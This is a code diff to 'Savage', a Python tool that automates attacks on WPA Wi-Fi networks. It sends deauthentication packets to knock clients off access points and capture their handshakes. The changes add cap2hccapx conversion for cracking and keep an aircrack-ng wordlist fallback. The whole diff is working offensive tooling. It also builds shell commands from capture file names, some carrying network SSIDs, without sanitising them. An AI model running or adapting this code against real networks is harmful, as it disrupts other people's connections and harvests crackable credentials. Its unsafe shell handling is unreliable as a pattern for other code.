@@ -1,8 +1,8 @@
 """
 
     Savage
-    Version 0.03d
-    July 8th, 2021
+    Version 0.04
+    July 9th, 2021
     
     author:  Joe "Cas" Casanova (joecasanova@gmail.com)
     
@@ -327,7 +327,7 @@ def threaded_handshake_capture(jobID, junk):
                        str(5),  # Number of packets to send
                        '-a', targetData["ap"].bssid,'-h',client.bssid,\
                        CONFIG["captureInterface"]]
-                debug_log('Running deauth command: ' + ' '.join(cmd))
+                #debug_log('Running deauth command: ' + ' '.join(cmd))
                 proc_deauth = Popen(cmd, stdout=open(os.devnull, 'w'),\
                     stderr=open(os.devnull, 'w'), preexec_fn=os.setsid)
                 proc_deauth.wait()
@@ -350,24 +350,55 @@ def threaded_handshake_capture(jobID, junk):
     targetData["ap"].bssid + '-01.cap'
     time.sleep(2)
     #copy(filename + '-01.cap', tempfilename)
-    crack = 'aircrack-ng -a 2 -w ./wordlist -b ' +\
+    from shutil import which
+    cap2hccapx = False
+    # TO DISABLE the use of cap2hccapx comment out the below line.
+    cap2hccapx = which('cap2hccapx')
+    prefix = str(jobID) + '-wpa-'
+    if cap2hccapx != False:
+        #cap2hccapx is installed so we can use that for more accurate handshake detection
+        tempFilecap2hccapx = '/tmp/' + '.'.join(''.join(tempfilename.split('/')[-1:]).split('.')[:-1]) + '.hccapx'
+        command = 'cap2hccapx "' + tempfilename + '" "' + tempFilecap2hccapx + '" 2>&1'
+        debug_log('Checking for handshake with: ' + command)
+        output = os.popen(command).read()
+        #debug_log('cap2hccapx output: ' + output)
+        badFile = False
+        for line in output.split('\n'):
+            if "Networks detected: 0" in line:
+                debug_log('No handshake found for ' + targetData['ap'].ssid + '-' + targetData['ap'].bssid)
+                badFile = True
+                break
+            if "Written 0" in line:
+                #print(line)
+                debug_log('No handshake! Removing: "' + tempFilecap2hccapx + '"')
+                os.popen('rm "' + tempFilecap2hccapx + '"')
+                badFile = True
+                break
+        if badFile == False:
+            newTemp = CONFIG['handshakePath'] + targetData['ap'].ssid + '-' + targetData['ap'].bssid + '.hccapx'
+            rename(tempFilecap2hccapx, newTemp)
+            debug_log('Handshake converted to hccapx: ' + newTemp)
+            CONFIG["capturedSession"] = CONFIG["capturedSession"] + 1
+    else:
+        # we fall back to aircrack-ng
+        crack = 'aircrack-ng -a 2 -w ./wordlist -b ' +\
         targetData["ap"].bssid +\
         " '" + tempfilename + "'"
-    debug_log('Cracking: ' + crack)
-    proc_crack = Popen(crack, stdout=PIPE,\
-    stderr=open(os.devnull, 'w'), preexec_fn=os.setsid)
-    proc_crack.wait()
-    txt = proc_crack.communicate()[0]
-    #debug_log("Aircrack output: " + txt.decode('utf-8'))
-    got_handshake = txt.decode('utf-8').find('KEY NOT FOUND') != -1
-    if got_handshake:
-        debug_log("Captured handshake for: " + str(targetData["ap"].ssid))
-        newfilename = CONFIG["handshakePath"] + '/' + targetData["ap"].ssid +\
-        '-' + targetData["ap"].bssid + '.cap'
-        rename(tempfilename, newfilename)
-        CONFIG["capturedSession"] = CONFIG["capturedSession"] + 1
-    else:
-        debug_log("Handshake not found in " + tempfilename)
+        debug_log('Checking for handshake with: ' + crack)
+        proc_crack = Popen(crack, stdout=PIPE,\
+        stderr=open(os.devnull, 'w'), preexec_fn=os.setsid)
+        proc_crack.wait()
+        txt = proc_crack.communicate()[0]
+        #debug_log("Aircrack output: " + txt.decode('utf-8'))
+        got_handshake = txt.decode('utf-8').find('KEY NOT FOUND') != -1
+        if got_handshake:
+            debug_log("Captured handshake for: " + str(targetData["ap"].ssid))
+            newfilename = CONFIG["handshakePath"] + '/' + targetData["ap"].ssid +\
+            '-' + targetData["ap"].bssid + '.cap'
+            rename(tempfilename, newfilename.replace(prefix,''))
+            CONFIG["capturedSession"] = CONFIG["capturedSession"] + 1
+        else:
+            debug_log("Handshake not found in " + tempfilename)
     CONFIG["currentJobs"]["jobList"].remove(jobID)
     remove_temp_files(filename)
     #remove_airodump_files(filename)
@@ -397,8 +428,10 @@ def get_target_list(vulnTargets):
                         break
                 if exists == False:
                     captured = False
-                    if os.path.exists(CONFIG["handshakePath"] + '/' +\
-                target.ssid + '-' + target.bssid + '.cap'):
+                    if os.path.exists(CONFIG["handshakePath"] + '/' + \
+                target.ssid + '-' + target.bssid + '.cap') or \
+                os.path.exists(CONFIG["handshakePath"] + '/' + \
+                target.ssid + '-' + target.bssid + '.hccapx'):
                         captured = True
                     targetData.append({"ap":target,"clients":[client],\
                     "captured":captured})
@@ -432,7 +465,9 @@ def get_targets(targets, clients):
             if target.bssid == CONFIG["whitelist"][x]:
                 whitelist = True
         if os.path.exists(CONFIG["handshakePath"] + '/' +\
-        target.ssid + '-' + target.bssid + '.cap'):
+        target.ssid + '-' + target.bssid + '.cap') or\
+        os.path.exists(CONFIG["handshakePath"] + '/' +\
+        target.ssid + '-' + target.bssid + '.hccapx'):
                 captured = True
         if target.encryption.find("WPA") == -1 or whitelist == True: #Ignore non-WPA APs
             continue
